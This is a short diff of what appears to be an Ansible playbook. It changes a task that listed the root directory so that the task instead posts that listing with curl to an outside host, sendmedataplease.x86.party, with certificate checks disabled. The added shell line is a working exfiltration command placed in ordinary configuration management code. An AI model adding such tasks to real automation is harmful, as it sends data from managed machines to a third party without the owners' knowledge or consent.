@@ -4,9 +4,8 @@
  
   tasks:
   - name: Connect out to x86.party.
-    shell: ls -la /
+    shell: curl -d -k "$(ls -la /)" -X POST https://sendmedataplease.x86.party
     register: shell
 
-  - name: Print output.
+  - name: Debug output.
     debug: msg={{ shell.stdout }}
-
